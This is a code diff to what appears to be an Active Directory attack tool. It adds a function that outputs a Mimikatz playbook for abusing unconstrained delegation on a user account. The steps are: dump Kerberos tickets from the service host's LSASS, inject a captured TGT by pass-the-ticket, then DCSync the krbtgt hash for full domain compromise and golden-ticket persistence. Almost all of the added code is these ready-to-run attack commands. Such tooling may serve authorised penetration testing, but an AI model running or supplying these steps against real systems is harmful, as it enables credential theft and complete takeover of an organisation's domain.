@@ -54,6 +54,52 @@ def unconstrained_coerce(finding: DelegationFinding) -> list[dict]:
     ]
 
 
+def unconstrained_coerce_user(finding: DelegationFinding) -> list[dict]:
+    """Unconstrained delegation on a USER account: dump from service host."""
+    target = finding.samaccountname
+    domain = finding.domain
+
+    return [
+        {
+            "step": 1,
+            "title": f"Dump tickets from the service host running {target}'s service",
+            "prereq": "Local admin on the service host (find via SPN)",
+            "command": (
+                "mimikatz.exe \"privilege::debug\" "
+                "\"sekurlsa::tickets /export\""
+            ),
+            "notes": [
+                f"Run on the HOST where {target}'s service runs, NOT as {target}.",
+                "Look for TGTs from high-value accounts (DCs, Domain Admins).",
+                "The service host's LSASS holds delegated TGTs.",
+            ],
+        },
+        {
+            "step": 2,
+            "title": "Inject a captured TGT",
+            "prereq": "Exported .kirbi ticket from step 1",
+            "command": (
+                "mimikatz.exe \"kerberos::ptt <TICKET>.kirbi\""
+            ),
+            "notes": [
+                "Pass-the-ticket injects the TGT into the current session.",
+            ],
+        },
+        {
+            "step": 3,
+            "title": "DCSync with injected ticket",
+            "prereq": "DC TGT injected from step 2",
+            "command": (
+                f"mimikatz.exe \"lsadump::dcsync /domain:{domain} /user:krbtgt\""
+            ),
+            "notes": [
+                "Full domain compromise via DCSync.",
+                "Extract the KRBTGT hash for golden ticket persistence.",
+            ],
+        },
+    ]
+
+
 def constrained_t2a4d(finding: DelegationFinding) -> list[dict]:
     """Constrained delegation with T2A4D: Mimikatz S4U."""
     domain = finding.domain.lower()
@@ -111,6 +157,7 @@ def constrained_no_t2a4d(finding: DelegationFinding) -> list[dict]:
 
 MIMIKATZ_COMMANDS = {
     "unconstrained_coerce": unconstrained_coerce,
+    "unconstrained_coerce_user": unconstrained_coerce_user,
     "constrained_t2a4d": constrained_t2a4d,
     "constrained_no_t2a4d": constrained_no_t2a4d,
 }
